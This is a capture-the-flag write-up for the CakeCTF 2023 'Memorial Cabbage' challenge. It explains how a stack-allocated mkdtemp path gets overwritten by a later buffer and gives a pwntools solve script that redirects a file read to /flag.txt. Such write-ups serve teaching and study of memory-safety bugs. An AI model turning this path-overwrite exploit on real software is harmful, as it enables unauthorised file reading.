# Memorial Cabbage

> Author: ptr-yudai<br>
> Description: Memorial Cabbage Unit 3<br>
> Attachment: [memorial-cabbage.tar.gz](https://raw.githubusercontent.com/d0UBleW/ctf/main/cake-ctf/pwn/memorial-cabbage/memorial-cabbage.tar.gz)<br>

<div class="hidden">
    keywords: CakeCTF 2023, pwn
</div>

## TL;DR

`mkdtemp` return value lives in the stack instead of heap which allow us to overwrite it.

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TEMPDIR_TEMPLATE "/tmp/cabbage.XXXXXX"

static char *tempdir;

void setup() {
  char template[] = TEMPDIR_TEMPLATE;

  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  if (!(tempdir = mkdtemp(template))) {
    perror("mkdtemp");
    exit(1);
  }
  if (chdir(tempdir) != 0) {
    perror("chdir");
    exit(1);
  }
}

void memo_r() {
  FILE *fp;
  char path[0x20];
  char buf[0x1000];

  strcpy(path, tempdir);
  strcpy(path + strlen(TEMPDIR_TEMPLATE), "/memo.txt");
  if (!(fp = fopen(path, "r")))
    return;
  fgets(buf, sizeof(buf) - 1, fp);
  fclose(fp);

  printf("Memo: %s", buf);
}

void memo_w() {
  FILE *fp;
  char path[0x20];
  char buf[0x1000];

  printf("Memo: ");
  if (!fgets(buf, sizeof(buf)-1, stdin))
    exit(1);

  strcpy(path, tempdir);
  strcpy(path + strlen(TEMPDIR_TEMPLATE), "/memo.txt");
  if (!(fp = fopen(path, "w")))
    return;
  fwrite(buf, 1, strlen(buf), fp);
  fclose(fp);
}

int main() {
  int choice;

  setup();
  while (1) {
    printf("1. Write memo\n"
           "2. Read memo\n"
           "> ");
    if (scanf("%d%*c", &choice) != 1)
      break;
    switch (choice) {
      case 1: memo_w(); break;
      case 2: memo_r(); break;
      default: return 0;
    }
  }
}
```

## Initial Analysis

At a glance, the program seems to not have any vulnerability. The `setup()`
function creates a temporary directory under `/tmp` and save the directory name
to `tempdir`. Both memo write and read have proper size constraints to prevent
buffer overflow and would operate on a file named `memo.txt` under `tempdir`.

Next, my plan is to just fill up `buf` with `0xfff` bytes of cyclic pattern and
observe any interesting outcome.

```console
gef> x/s (char*)tempdir
0x7ffd9aab6920: "/tmp/cabbage.FSWsBP"
gef> ni
gef> x/s (char*)tempdir
0x7ffd9aab6920: "bovabowaboxabo"
```

Turns out that our input overwrites part of `tempdir`. This happens because
`mkdtemp` returns `char *` that is pointing to the stack and when the `setup()`
returns, the string `/tmp/cabbage.FSWsBP` is located in the stack area which
would be used to allocate local variables when another function is called.
In this case, when `memo_w` is called, the memory which would be allocated for
`buf` overlaps with `tempdir`, which allows us to overwrite the path value.

```console
gef> x/5i memo_w+59
   0x55565ba76502 <memo_w+59>:  mov    rdx,QWORD PTR [rip+0x2b17]        # 0x55565ba79020 <stdin@GLIBC_2.2.5>
   0x55565ba76509 <memo_w+66>:  lea    rax,[rbp-0x1010]
   0x55565ba76510 <memo_w+73>:  mov    esi,0xfff
   0x55565ba76515 <memo_w+78>:  mov    rdi,rax
   0x55565ba76518 <memo_w+81>:  call   0x55565ba76180 <fgets@plt>
gef> x/gx $rbp-0x1010
0x7ffd9aab5930: 0x6161616261616161
gef> p/x 0x7ffd9aab5930+0x1000
$6 = 0x7ffd9aab6930
```

## Solution

Now that we are able to overwrite the value of `tempdir` and the memo path
is constructed everytime `memo_r` is called, we could overwrite `tempdir` to be
`/flag.txt\x00`. Since the length of `/flag.txt\x00` is shorter than `TEMPDIR_TEMPLATE`,
when `strcpy(path + strlen(TEMPDIR_TEMPLATE), "/memo.txt")` is called, our NULL
termination stays and `fopen()` would open `/flag.txt`, instead of `/flag.txtgarbage/memo.txt`

> [!IMPORTANT]
> When testing locally, make sure that the running user has no write permission
> to `/flag.txt` since `memo_w` would not return early and instead overwrite
> the content of `/flag.txt`.

Final solve script:

```python
#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./cabbage", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc memorialcabbage.2023.cakectf.com 9001"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

io.sendline(b"1")
io.sendline(cyclic(0xff0) + b"/flag.txt\x00")
io.sendline(b"2")

io.interactive()
```

```console
$ ./solve.py REMOTE HOST=localhost PORT=9001
[+] Opening connection to localhost on port 9001: Done
[*] Switching to interactive mode
1. Write memo
2. Read memo
> Memo: 1. Write memo
2. Read memo
> Memo: FakeCTF{*** REDACTED ***}
1. Write memo
2. Read memo
> $
```
